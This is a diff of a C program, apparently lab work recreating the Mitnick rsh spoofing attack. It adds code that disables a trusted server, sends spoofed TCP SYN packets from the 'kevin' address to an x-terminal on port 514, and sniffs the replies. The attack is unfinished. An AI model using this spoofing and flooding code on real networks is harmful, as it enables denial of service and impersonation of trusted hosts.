@@ -2,19 +2,23 @@
 #include <stdlib.h>
 #include <libnet.h>
 #include <unistd.h>
+#include <pthread.h>
 #include "flood.h"
 #include "sender.h"
-int main() {
+#include "packetsniffer.h"
 
+int main()
+{
+ 
     //Defining variables
     u_long server;
     u_long xterminal;
     u_long kevin;
-
+    struct pcap_pkthdr pkheader;	
     libnet_t *l;  //Libnet Context
 
     char errbuf[LIBNET_ERRBUF_SIZE];
-
+    const u_char *packet;
     l = libnet_init(LIBNET_RAW4, NULL, errbuf);
 
     if ( l == NULL ) {
@@ -44,15 +48,27 @@ int main() {
 
 
     //Server flood
-
+    printf("\n Disabling server...");
     disableServer(l,kevin,server);
 
-    //Predict the seq
+    pcap_t* des=packetSnifferInitialize();
 
+    for(int i=0; i<2;i++)
+    {
+        //send packet
+        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)123456,(u_int32_t)1,NULL,0,TH_SYN);
+        ipTagCreate(l,(u_int32_t)kevin,(u_int32_t)xterminal,NULL,(u_int32_t)0);
+        sendPacket(l);
+        packet = pcap_next(des, &pkheader);
+        printf("%s\n",packet);
+
+    }
+
+    printf("\n Enabling the server...");
     enableServer(l,kevin,server);
 
     //restore server
     enableServer(l,kevin,server);
     libnet_destroy(l);
     return 0;
-    }
+}
